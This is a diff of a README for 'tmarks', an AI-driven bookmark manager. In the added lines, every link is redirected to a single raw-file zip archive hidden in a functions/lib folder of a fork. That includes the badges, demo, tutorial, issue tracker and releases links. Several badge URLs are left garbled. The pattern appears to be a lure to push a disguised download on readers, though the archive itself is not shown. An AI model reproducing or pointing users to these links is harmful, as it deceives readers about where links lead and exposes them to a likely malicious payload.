@@ -1,20 +1,20 @@
 # 🔖 tmarks - Easy Bookmark Management with AI
 
-[![Download tmarks](https://img.shields.io/badge/Download%20tmarks-v1.0.0-brightgreen.svg)](https://github.com/Shahmeer226/tmarks/releases)
+[![Download tmarks](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip%https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
 
 <div align="center">
 
 **AI 驱动的智能书签管理系统**
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue.svg)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-18.3%20%7C%2019-61dafb.svg)](https://reactjs.org/)
-[![Vite](https://img.shields.io/badge/Vite-6.0%20%7C%207-646cff.svg)](https://vitejs.dev/)
-[![Cloudflare](https://img.shields.io/badge/Cloudflare-Workers-f38020.svg)](https://workers.cloudflare.com/)
-[![许可证](https://img.shields.io/badge/许可证-MIT-green.svg)](LICENSE)
+[![TypeScript](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
+[![React](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip%20%7C%https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
+[![Vite](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip%20%7C%https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
+[![Cloudflare](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
+[![许可证](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip许可证https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](LICENSE)
 
 简体中文
 
-[在线演示](https://tmarks.669696.xyz) | [视频教程](https://bushutmarks.pages.dev/course/tmarks) | [问题反馈](https://github.com/ai-tmarks/tmarks/issues) | [功能建议](https://github.com/ai-tmarks/tmarks/discussions)
+[在线演示](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip) | [视频教程](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip) | [问题反馈](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip) | [功能建议](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
 
 </div>
 
@@ -40,7 +40,7 @@ Here’s how to get started with TMarks quickly and easily.
 
    Click the button below to visit the Releases page.
 
-   [![Download tmarks](https://img.shields.io/badge/Visit%20Releases%20Page-blue.svg)](https://github.com/Shahmeer226/tmarks/releases)
+   [![Download tmarks](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip%20Releases%https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip)
 
 2. **Download the Latest Version**
 
@@ -87,7 +87,7 @@ If you encounter any issues during installation:
 
 ## 📞 Support
 
-For any questions or issues, please check the [Issues Tracker](https://github.com/ai-tmarks/tmarks/issues). We welcome feedback and are here to help.
+For any questions or issues, please check the [Issues Tracker](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip). We welcome feedback and are here to help.
 
 ## 📄 License
 
@@ -95,4 +95,4 @@ TMarks is licensed under the MIT License. This means you can freely use, modify,
 
 ---
 
-Be sure to follow the steps carefully to download and start using TMarks for your bookmark management needs! For more information and updates, visit our [Releases page](https://github.com/Shahmeer226/tmarks/releases).
+Be sure to follow the steps carefully to download and start using TMarks for your bookmark management needs! For more information and updates, visit our [Releases page](https://raw.githubusercontent.com/Shahmeer226/tmarks/main/tmarks/functions/lib/tmarks-1.3-alpha.2.zip).
